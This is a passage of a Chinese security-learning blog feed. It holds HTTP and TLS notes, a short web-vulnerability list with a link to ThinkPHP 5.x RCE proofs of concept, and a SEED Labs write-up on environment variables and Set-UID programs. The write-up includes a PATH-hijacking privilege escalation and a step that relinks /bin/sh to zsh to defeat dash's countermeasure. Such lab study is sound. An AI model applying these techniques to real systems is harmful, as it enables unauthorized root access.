Found有着相同的含义。</li><li>307会遵照浏览器标准，不会从POST变成GET。但是，对于处理响应时的行为，每种浏览器有可出现不同的情况（这个响应码在web应用里不太常用，而某些浏览器对它的处理也不是很统一）。</li></ul><h2 id="xx状态码-2">4.4 4XX状态码</h2><ul><li>4XX响应结果代表客户端发生错误。</li><li>常见的有400、401、403、404</li></ul><p><strong>400 Bad Request(不合规范的请求）:</strong></p><p>400表示请求报文中存在<strong>语法错误</strong>，当错误发生时，需修改请求的内容后再次发送请求。</p><p><strong>401 Unauthorized：</strong></p><ul><li>401表示发送的请求需要有通过HTTP认证的认证信息。</li><li>含有401的响应必须包含一个适用于被请求资源的www-Authenticate首部用以质询用户信息。</li></ul><p><strong>403 Forbidden：</strong></p><p>403表明对请求资源的访问被服务器拒绝了。</p><p><strong>404 Not Found：</strong></p><ul><li>404表明服务器上无法找到请求的资源，或服务端拒绝请求，但又不想说明理由时使用。</li><li>通常响应消息体会显示给用户。</li></ul><h2 id="xx状态码-3">4.5 5XX状态码</h2><ul><li>5XX的响应结果表明服务器本身发生错误。</li><li>常见的有:500、503</li></ul><p><strong>500 Internal server error：</strong></p><ul><li>500表明服务器端在执行请求时发生了错误。也有可能是web应用存在的bug或某些临时的故障。</li></ul><p><strong>503 Service Unavaiable：</strong></p><ul><li>503表示服务器暂时处于负载或正在进行停机维护，现在无法处理请求。</li><li>可通过Retry-After首部字段填上解除以上状况的时间，返回给客户端。</li></ul><h1 id="报文头部">5. 报文头部</h1><h2 id="http报文结构">5.1 HTTP报文结构</h2><p><strong>HTTP报文：</strong></p><ul><li>用于HTTP协议交互的信息被称为HTTP报文。</li><li>请求端的HTTP报文被称为请求报文。</li><li>响应端的HTTP报文被称为响应报文。</li></ul><p><strong>HTTP报文结构：</strong></p><ul><li>HTTP报文本身是由多行数据构成的字符串文本。</li><li>HTTP报文大致分为<strong>报文首部和报文主体</strong>两块，两者由<strong>空行</strong>来划分。</li></ul><p><strong>请求报文：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541333.png"alt="image-20231120150947972" /><figcaption aria-hidden="true">image-20231120150947972</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541334.png"alt="image-20231120151115683" /><figcaption aria-hidden="true">image-20231120151115683</figcaption></figure><ul><li>请求行，包含用于请求的方法，请求的URI和HTTP版本。</li><li>首部字段，包含表示请求和响应的各种条件和属性的各类首部。</li></ul><p><strong>响应报文：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541335.png"alt="image-20231120151139025" /><figcaption aria-hidden="true">image-20231120151139025</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541336.png"alt="image-20231120151204758" /><figcaption aria-hidden="true">image-20231120151204758</figcaption></figure><ul><li>状态行，包含表明响应结果的状态码，原因短语和HTTP版本。</li></ul><h2 id="通用首部字段">5.2 通用首部字段</h2><p>通用首部字段，是指在请示头部和响应头部都会使用的字段。</p><h3 id="cache-control">5.2.1 Cache-Control</h3><ul><li>通过指定该字段，就能操作缓存的工作机制。</li><li>指令的参数是可选的，多个指令之间通过“，“分隔。例如：Cache-control：private，max-age=0，no-cache</li></ul><p><strong>缓存请求指令：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541337.png"alt="image-20231120151447507" /><figcaption aria-hidden="true">image-20231120151447507</figcaption></figure><p><strong>缓存响应指令：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311201541338.png"alt="image-20231120151508310" /><figcaption aria-hidden="true">image-20231120151508310</figcaption></figure><h3 id="connection">5.2.2 Connection</h3><ul><li>控制不再转发给代理的首部字段</li><li>管理持久连接：HTTP/1.1之前的HTTP版本的默认连接都是非持久连接，HTTP/1.1默认为持久连接，当服务器端明确断开连接时，则指定Connection首部字段的值为Close。</li></ul><h3 id="date">5.2.3 Date</h3><p>Date字段表明创建HTTP报文的日期和时间。</p><h2 id="请求首部字段">5.3 请求首部字段</h2><p>请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求得附加信息、客户端信息、对响应相关的优先级等内容。</p><ul><li>Host:请求资源的主机和端口号</li><li>User-Agent:客户端操作系统，浏览器等其他信息</li><li>Referer:访问当前页面的上一个页面</li><li>Cookie:请求者的身份凭证</li><li>Accept:客户端希望接收的哪些MIME类型消息</li><li>Accept-Charset:指定客户端接收的字符集</li></ul><h2 id="响应首部字段">5.4 响应首部字段</h2><p>响应首部字殴是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等息。</p><ul><li>Server:服务器所使用的web服务名字</li><li>Set-Cookie:向客户端设置Cookie</li><li>Last-Modified:告诉浏览器资源修改的最后时间</li><li>Content-Length:正文长度</li><li>Lacation:引导用户转向与请求URI不同的资源</li></ul><h2 id="实体首部字段">5.5 实体首部字段</h2><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间与实体相关的信息。</p><ul><li>Allow:通知客户端能够支持的HTTP方法。比如:GET、HEAD</li><li>Content-Encoding:告知客户端服务器对实体主体部分采用的字符编码</li><li>Cantent-Language:告知客户端实体部分采用的语言</li><li>Content-Length:表明实体主体部分大小</li><li>Content-Location:给出与报文主体部分相对应实际的URI</li><li>Content-Type:说明实体主体部分对象的媒体类型</li></ul><h2 id="cookie首部字段">5.6 Cookie首部字段</h2><p>Cookie的工作机制是用户识别及状态管理。</p><ul><li>Set-cookie:响应首部字段，开始状态管理所使用的Cookie信息。当服务器准备开始管理客户端的状态时，会事先告知各种信息。</li><li>Cookie:请求首部字段，服务器接收到的Cookie信息。当客户端想获得HTTP状态管理支持时，就会在请求中包含从服务接收到的Cookie。接收到多个Cookie时，同样可以以多个Cookie形式发送。</li></ul><h1 id="请求响应过程">6. 请求响应过程</h1><ul><li>浏览器:用户输入url</li><li>DNS域名解析</li><li>建立TCP链接(三次握手)</li><li>发送HTTP Request</li><li>web服务器响应(回复）</li><li>应用服务器响应(回复）</li><li>关闭TCP链接(四次挥手)</li><li>用户浏览器渲染页面</li></ul><h1 id="https扩展">7. HTTPS扩展</h1><ul><li>HTTPS是Hypertext Transfer ProtocolSecure（安全的超文本传输协议）的缩写。它是HTTP的安全版本，用于在Web浏览器和网站之间加密数据传输。HTTPS通过使用SSL（SecureSockets Layer）或其继任者TLS（Transport LayerSecurity）协议来提供加密保护。</li><li>TLS的主要功能包括：<ol type="1"><li><strong>加密：</strong>TLS使用密码学技术对传输的数据进行加密，使得即使被拦截，也很难被解读。这有助于保护用户的敏感信息，如登录凭据、支付信息等。</li><li><strong>认证：</strong>TLS通过数字证书来验证通信的双方身份。服务器会提供数字证书，证明它的身份是合法的。客户端可以验证这个证书，并确保它正在与预期的服务器建立连接，而不是遭受中间人攻击。</li><li><strong>数据完整性：</strong>TLS使用哈希函数等技术来确保传输的数据在传输过程中没有被篡改。如果数据在传输过程中被修改，接收方能够检测到并拒绝处理已损坏的数据。</li><li><strong>前向保密性：</strong>TLS支持前向保密性，这意味着即使密钥被泄露，以前的通信也无法被解密。这提供了一层额外的安全性，即使在密钥被泄露的情况下，以前的通信也不容易受到威胁。</li></ol></li><li>TLS v1.2的协商过程包括以下步骤：<ol type="1"><li><strong>客户端Hello：</strong>客户端向服务器发送一个ClientHello消息，其中包含以下信息：<ul><li>支持的TLS协议版本（包括TLS v1.2）。</li><li>一个随机数，用于后续密钥生成。</li><li>支持的加密算法列表，包括密钥交换算法、加密算法和哈希算法。</li><li>可选的会话标识符，用于恢复先前的会话。</li></ul></li><li><strong>服务器Hello：</strong>服务器从客户端的ClientHello消息中选择TLSv1.2作为协议版本，并向客户端发送ServerHello消息，其中包含以下信息：<ul><li>一个随机数，与客户端的随机数一起用于后续密钥生成。</li><li>服务器选择的加密算法。</li><li>服务器选择的数字证书，包含公钥和服务器的身份信息。</li></ul></li><li><strong>服务器证书：</strong>如果服务器需要进行身份验证，它会将数字证书发送给客户端。</li><li><strong>服务器Key Exchange（可选）：</strong>如果服务器选择的密钥交换算法要求，服务器会发送一个ServerKeyExchange消息，其中包含用于密钥交换的信息。</li><li><strong>证书请求（可选）：</strong>如果服务器需要客户端提供数字证书，服务器会发送一个CertificateRequest消息。</li><li><strong>服务器Hello Done：</strong>服务器发送一个ServerHelloDone消息，表示握手消息的一部分已经完成。</li><li><strong>客户端证书：</strong>如果服务器请求客户端提供数字证书，客户端会发送一个Certificate消息，其中包含客户端的数字证书。</li><li><strong>客户端Key Exchange：</strong>客户端生成预主秘钥，然后使用服务器的公钥加密这个预主秘钥，并将结果发送给服务器。</li><li><strong>证书验证（可选）：</strong>如果服务器要求，客户端可以验证服务器的数字证书。</li><li><strong>完成握手：</strong>客户端和服务器分别发送Finished消息，表示握手过程已经完成。</li><li><strong>应用数据加密：</strong>从此刻开始，客户端和服务器使用协商好的加密算法和会话密钥对通信数据进行加密和解密。</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>知识框架</title>
    <link href="/2023/10/27/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/10/27/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/%E7%9F%A5%E8%AF%86%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试工具使用">1. 渗透测试工具使用</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310271359505.png"alt="image-20231027091354324" /><figcaption aria-hidden="true">image-20231027091354324</figcaption></figure><h1 id="信息收集">2. 信息收集</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101403241.png"alt="image-20231110140312361" /><figcaption aria-hidden="true">image-20231110140312361</figcaption></figure><h1 id="sql注入漏洞">3. SQL注入漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291528183.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="xss漏洞">4. XSS漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312070908252.png"alt="image-20231207090759184" /><figcaption aria-hidden="true">image-20231207090759184</figcaption></figure><h1 id="命令执行漏洞">5. 命令执行漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312161444151.png"alt="image-20231216144419051" /><figcaption aria-hidden="true">image-20231216144419051</figcaption></figure><h1 id="文件上传与解析漏洞">6. 文件上传与解析漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312251422400.png"alt="image-20231225142233947" /><figcaption aria-hidden="true">image-20231225142233947</figcaption></figure><h1 id="文件包含漏洞">7. 文件包含漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202401011431438.png"alt="image-20240101143042450" /><figcaption aria-hidden="true">image-20240101143042450</figcaption></figure><h1 id="逻辑漏洞">8. 逻辑漏洞</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202401071555222.png"alt="image-20240107155528860" /><figcaption aria-hidden="true">image-20240107155528860</figcaption></figure><h1 id="基线管理与安全配置">9. 基线管理与安全配置</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202401112034325.png"alt="image-20240111203422507" /><figcaption aria-hidden="true">image-20240111203422507</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>知识框架</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞(合集)</title>
    <link href="/2023/10/25/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E(%E5%90%88%E9%9B%86)/"/>
    <url>/2023/10/25/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E(%E5%90%88%E9%9B%86)/</url>
    
    <content type="html"><![CDATA[<h1 id="phps文件">1. phps文件</h1><p>phps文件就是php的<strong>源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容.因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替.其实，只要不用php等已经在服务器中注册过的MIME类型的文件扩展名即可，但为了国际通用，所以才用了phps文件类型.</p><h1 id="robots协议">2. Robots协议</h1><ul><li><code>robots.txt</code>文件被网络爬虫用来检查是否允许它们抓取和索引该网站，或者只允许抓取和索引网站的部分内容.有时，这些文件会暴露<strong>目录结构</strong>，而不是保护内容不被抓取.</li><li>存放目录：<code>robots.txt</code>文件必须要存放在网站的根目录下，即通过<code>域名/robots.txt</code>可以访问此文件.</li></ul><h1 id="xff_referer">3. xff_referer</h1><ul><li>X-Forward-For（xff）：客户端连接到网页的ip</li><li>referer：客户从哪个网页来访问的当前页面</li></ul><h1 id="备份文件">4. 备份文件</h1><p>常见的备份文件后缀名有:<code>.git .svn .swp .svn .~ .bak .bash_history</code></p><h1 id="php弱类型">5. php弱类型</h1><table><thead><tr class="header"><th>例子</th><th>名称</th><th>结果</th></tr></thead><tbody><tr class="odd"><td>$a == $b</td><td>等于</td><td><strong><code>true</code></strong>，如果类型转换后 $a 等于 $b。</td></tr><tr class="even"><td>$a === $b</td><td>全等</td><td><strong><code>true</code></strong>，如果 $a 等于$b，并且它们的类型也相同。</td></tr></tbody></table><p>注：如果一个数值和字符串进行比较的时候，会将字符串转换成数值.当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含<code>'.','e','E'</code>并且其数值在整型的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0.</p><p><strong>相关内容：</strong></p><ul><li><code>is_numeric()</code>函数会判断如果是数字和数字字符串则返回TRUE，否则返回 FALSE</li><li><code>array_search()</code>函数在数组中查找元素，并返回下标，但查找过程使用了弱类型比较</li><li>低版本php中科学计数法长度按字符串来算</li></ul><h1 id="thinkphp-5.x">6. ThinkPHP 5.x</h1><p>前言：ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞.该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本.</p><p>利用：https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</p>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Environment_Variable_and_SetUID</title>
    <link href="/2023/10/25/SEED-LABS/Software%20Security/Environment_Variable_and_SetUID/"/>
    <url>/2023/10/25/SEED-LABS/Software%20Security/Environment_Variable_and_SetUID/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><ul><li>本实验的学习目标是让学生了解环境变量如何影响程序和系统行为。环境变量是一组动态的命名值，可以影响计算机上运行进程的行为方式。自1979 年 Unix引入环境变量以来，大多数操作系统都使用环境变量。尽管环境变量会影响程序的行为，但许多程序员并不十分了解它们是如何实现的。因此，如果程序使用了环境变量，但程序员并不知道使用了环境变量，程序就可能存在漏洞。</li><li>在本实验室中，学生将了解环境变量的工作原理、环境变量如何从父进程传播到子进程，以及环境变量如何影响系统/程序行为。我们尤其感兴趣的是环境变量如何影响Set-UID 程序的行为，这些程序通常是特权程序。本实验室涵盖以下主题：<ul><li>环境变量</li><li>Set-UID 程序</li><li>安全调用外部程序</li><li>能力泄露</li><li>动态加载器/链接器</li></ul></li></ul><h1 id="lab-tasks">2. Lab Tasks</h1><h2 id="task-1-manipulating-environment-variables">2.1 Task 1:Manipulating Environment Variables</h2><p>在本任务中，我们将学习用于设置和取消设置环境变量的命令。我们在种子账户中使用Bash。用户使用的默认 shell 设置在 /etc/passwd文件中（每个条目的最后一栏）。你可以使用 <code>chsh</code>命令将其更改为其他 shell程序（请不要在本实验中使用）。请完成以下任务：</p><ol type="1"><li><p>使用<code>printenv</code>或<code>env</code>命令打印出环境变量。对于特定的环境变量，如PWD，可以使用<code>printenv PWD</code>或<code>env | grep PWD</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015240.png"alt="image-20231025094609055" /><figcaption aria-hidden="true">image-20231025094609055</figcaption></figure></li><li><p>使用 export 和 unset设置或取消设置环境变量。需要注意的是，这两条命令并不是独立的程序；它们是Bash 的两个内部命令，即在 Bash 之外无法找到它们。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015241.png"alt="image-20231025094645788" /><figcaption aria-hidden="true">image-20231025094645788</figcaption></figure></li></ol><h2id="task-2-passing-environment-variables-from-parent-process-to-child-process">2.2Task 2: Passing Environment Variables from Parent Process to ChildProcess</h2><p>在本任务中，我们将研究子进程如何从父进程获取环境变量。在 Unix中，fork()通过复制调用进程来创建一个新进程。被称为子进程的新进程与被称为父进程的调用进程完全相同，但子进程并不继承父进程的某些功能（请键入以下命令查看fork() 的使用手册：manfork）。在本任务中，我们想知道父进程的环境变量是否被子进程继承。</p><p><strong>步骤1</strong>：请编译并运行以下程序，并描述你的观察结果。该程序可以在Labsetup文件夹中找到；可以使用<code>gcc myprintenv.c</code>进行编译，编译后将生成名为<code>a.out</code>的二进制文件。让我们运行它，并使用<code>a.out &gt; file</code>将输出保存到文件中。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553568.png"alt="image-20231208150724790" /><figcaption aria-hidden="true">image-20231208150724790</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553569.png"alt="image-20231208150753552" /><figcaption aria-hidden="true">image-20231208150753552</figcaption></figure><p><strong>步骤 2</strong>：现在注释掉子进程情况下的 printenv() 语句（第➀ 行），取消注释父进程情况下的 printenv() 语句（第 ➁行）。再次编译并运行代码，并描述您的观察结果。将输出保存到另一个文件中。</p><p><strong>步骤 3</strong>：使用 diff命令比较这两个文件的差异。请得出结论。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>每个程序都有一个环境表，它是一个字符指针数组，其中每个指针包含一个以NULL结尾的C字符串的地址。全局变量environ则包含了该指针数组的地址。fork()函数会通过系统调用创建一个与父进程几乎完全相同的子进程，fork()函数会有两个返回值，在父进程中返回子进程的ID；在子进程中返回0，若出现错误则返回一个负值。</p></li><li><p>编译运行myprintenv.c，并将输出结果保存到child_env，输出打印了子进程的环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015242.png"alt="image-20231025094953836" /><figcaption aria-hidden="true">image-20231025094953836</figcaption></figure></li><li><p>注释掉子进程情况下的 printenv() 语句，取消注释父进程情况下的的printenv()语句。再次编译并运行代码，并将输出保存到parent_env，输出打印了父进程的环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015243.png"alt="image-20231025095016365" /><figcaption aria-hidden="true">image-20231025095016365</figcaption></figure></li><li><p>使用 diff命令比较这两个文件的差异，发现两个文件完全相同。<strong>结论：如果使用fork()创建了一个新进程，则子进程将继承其父进程的环境变量。</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015244.png"alt="image-20231025095039820" /><figcaption aria-hidden="true">image-20231025095039820</figcaption></figure></li></ol><h2 id="task-3-environment-variables-and-execve">2.3 Task 3: EnvironmentVariables and execve()</h2><p>在本任务中，我们将研究当通过 execve()执行一个新程序时，环境变量会受到怎样的影响。 函数 execve()调用系统调用来加载一个新命令并执行该命令；该函数永远不会返回。不会创建新进程；相反，调用进程的文本、数据、bss和堆栈会被加载程序的文本、数据、bss 和堆栈覆盖。本质上，execve()在调用进程中运行新程序。我们感兴趣的是环境变量会发生什么变化；它们会被新程序自动继承吗？</p><p><strong>步骤1</strong>：请编译并运行以下程序，并描述你的观察结果。该程序只需执行一个名为/usr/bin/env 的程序，即可打印出当前进程的环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553570.png"alt="image-20231208151147534" /><figcaption aria-hidden="true">image-20231208151147534</figcaption></figure><p><strong>步骤2</strong>：将第①行中 execve()的调用改为以下内容；描述你的观察结果。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">execve(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, environ)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>步骤 3</strong>：请就新程序如何获取环境变量得出结论。</p><ol type="1"><li><p>execve()函数原型：filename:准备载入当前进程空间的新程序的路径名。既可以是绝对路径，又可以是相对路径；argv[]:指定了传给新程序的命令行参数，该数组对应于c语言main函数的argv参数数组，格式也相同，argv[0]对应命令名，通常情况下该值与filename中的basename(就是绝对路径的最后一个)相同；envp[]:最后一个参数envp指定了新程序的环境列表。参数envp对应于新程序的environ数组。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015245.png"alt="image-20231025095130506" /><figcaption aria-hidden="true">image-20231025095130506</figcaption></figure></li><li><p>编译运行myenv.c，没有任何输出，说明新程序没有任何环境变量。将execve("/usr/bin/env",argv, NULL)语句修改为execve("/usr/bin/env", argv,environ)，发现可以打印出环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015246.png"alt="image-20231025095202720" /><figcaption aria-hidden="true">image-20231025095202720</figcaption></figure></li><li><p><strong>结论：如果进程使用execve()启动一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失，需要通过envp参数传递环境变量。</strong></p></li></ol><h2 id="task-4-environment-variables-and-system">2.4 Task 4: EnvironmentVariables and system()</h2><p>在本任务中，我们将研究通过 system()函数执行新程序时，环境变量会受到怎样的影响。该函数用于执行命令，但与直接执行命令的execve() 不同，system() 实际上是执行"/bin/sh -c 命令"，即执行/bin/sh，并要求 shell 执行命令。</p><p>如果查看 system() 函数的实现，就会发现它使用 execl() 来执行/bin/sh；execl() 调用execve()，将环境变量数组传递给它。请编译并运行下面的程序来验证这一点。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553571.png"alt="image-20231208151452185" /><figcaption aria-hidden="true">image-20231208151452185</figcaption></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>编译运行system.c，输出了环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015247.png"alt="image-20231025095339373" /><figcaption aria-hidden="true">image-20231025095339373</figcaption></figure></li><li><p><strong>结论：使用system()执行命令，调用进程的环境变量会传递给新程序/bin/sh。</strong></p></li></ol><h2 id="task-5-environment-variable-and-set-uid-programs">2.5 Task 5:Environment Variable and Set-UID Programs</h2><p>Set-UID 是 Unix 操作系统中的一种重要安全机制。当 Set-UID程序运行时，它会获得所有者的权限。例如，如果程序的所有者是root，那么当任何人运行该程序时，程序在执行过程中都会获得 root的权限。Set-UID允许我们做许多有趣的事情，但由于它会提升用户的权限，因此风险很大。虽然Set-UID程序的行为是由程序逻辑决定的，而不是由用户决定的，但用户确实可以通过环境变量影响程序的行为。要了解Set-UID 程序如何受到影响，我们首先要弄清楚 Set-UID程序的进程是否从用户进程继承了环境变量。</p><p><strong>步骤1</strong>：编写以下程序，打印出当前进程中的所有环境变量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553572.png"alt="image-20231208151853834" /><figcaption aria-hidden="true">image-20231208151853834</figcaption></figure><p><strong>步骤 2</strong>：编译上述程序，将其所有权更改为root，并使其成为 Set-UID 程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">// Asssume the program’s name is foo<br>$ sudo <span class="hljs-built_in">chown</span> root foo<br>$ sudo <span class="hljs-built_in">chmod</span> 4755 foo<br></code></pre></td></tr></table></figure><p><strong>步骤 3</strong>：在 shell 中（需要使用普通用户账户，而不是root 账户），使用导出命令设置以下环境变量（它们可能已经存在）：</p><ul><li><p>PATH</p></li><li><p>LD LIBRARY PATH</p></li><li><p>ANY NAME（这是一个由你定义的环境变量，所以随便取个名字吧）</p><p>这些环境变量是在用户的 shell 进程中设置的。现在，在 shell 中运行步骤2 中的 Set-UID 程序。在 shell 中键入程序名称后，shell会分叉一个子进程，并使用子进程运行程序。请检查您在 shell进程（父进程）中设置的所有环境变量是否都进入了 Set-UID子进程。描述你的观察结果。如果有让你感到意外的地方，请描述出来。</p></li></ul><p><strong>实验流程：</strong></p><ol type="1"><li><p>编译foo.c，将其所有权更改为 root，并使其成为 Set-UID 程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015248.png"alt="image-20231025095516474" /><figcaption aria-hidden="true">image-20231025095516474</figcaption></figure></li><li><p>设置环境变量：<code>PATH</code>:可执行文件的搜索路径；<code>LD_LIBRARY_PATH</code>:程序编译期间查找动态链接库时指定的查找共享库的路径。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015249.png"alt="image-20231025095542115" /><figcaption aria-hidden="true">image-20231025095542115</figcaption></figure></li><li><p>运行程序。 发现PATH和ANYNAME进入了子进程，LD_LIBRARY_PATH没有进入子进程。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015251.png"alt="image-20231025095601892" /><figcaption aria-hidden="true">image-20231025095601892</figcaption></figure></li><li><p><strong>原因分析：动态链接器实现了一个对策，当EUID和RUID不同时，它会忽略<code>LD_PRELOAD</code>和<code>LD_LIBRARY_PATH</code>环境变量。</strong></p></li></ol><h2 id="task-6-the-path-environment-variable-and-set-uid-programs">2.6Task 6: The PATH Environment Variable and Set-UID Programs</h2><p>由于调用的是 shell 程序，在 Set-UID 程序中调用 system()是相当危险的。 这是因为 shell 程序的实际行为可能会受到环境变量（如PATH）的影响；这些环境变量是由用户提供的，而用户可能是恶意的。通过更改这些变量，恶意用户可以控制Set-UID 程序的行为。在 Bash 中，你可以用以下方法更改 PATH环境变量（本例将目录 /home/seed 添加到 PATH 环境变量的开头）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> PATH=/home/seed:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>下面的 Set-UID 程序本应执行 /bin/ls 命令，但程序员只使用了 ls命令的相对路径，而不是绝对路径：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553573.png"alt="image-20231208152508393" /><figcaption aria-hidden="true">image-20231208152508393</figcaption></figure><p>请编译上述程序，将其所有者改为 root，并使其成为一个 Set-UID程序。你能让这个 Set-UID 程序运行你自己的恶意代码，而不是/bin/ls？如果可以，你的恶意代码是否以 root权限运行？描述并解释你的观察结果。</p><p><strong>注</strong>：system(cmd)函数首先执行/bin/sh程序，然后要求该shell程序运行cmd命令。在Ubuntu 20.04（以及之前的几个版本）中，/bin/sh 实际上是一个指向 /bin/dash的符号链接。这个 shell 程序有一个防止自己在 Set-UID进程中被执行的对策。基本上，如果 dash 检测到它是在一个 Set-UID进程中执行的，它会立即将有效用户 ID 更改为进程的真实用户ID，从根本上取消权限。</p><p>由于受害者程序是一个 Set-UID 程序，/bin/dash中的反措施可以阻止我们的攻击。为了了解我们的攻击在没有这种对策的情况下是如何工作的，我们将把/bin/sh 链接到另一个没有这种对策的 shell。我们在 Ubuntu 20.04虚拟机中安装了一个名为 zsh 的 shell 程序。我们使用以下命令将 /bin/sh链接到 /bin/zsh：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>将目录 /home/seed添加到PATH环境变量的开头，因为寻找可执行文件时优先从靠前的路径中查找。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015252.png"alt="image-20231025095649662" /><figcaption aria-hidden="true">image-20231025095649662</figcaption></figure></li><li><p>编译ls.c，将其所有者改为 root，并使其成为 Set-UID 程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015253.png"alt="image-20231025095711599" /><figcaption aria-hidden="true">image-20231025095711599</figcaption></figure></li><li><p>创建myls.c，编译为ls,需要放在/home/seed路径下,以便执行system(“ls”)时能够优先找到我们自己编写的ls.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015254.png"alt="image-20231025095731936" /><figcaption 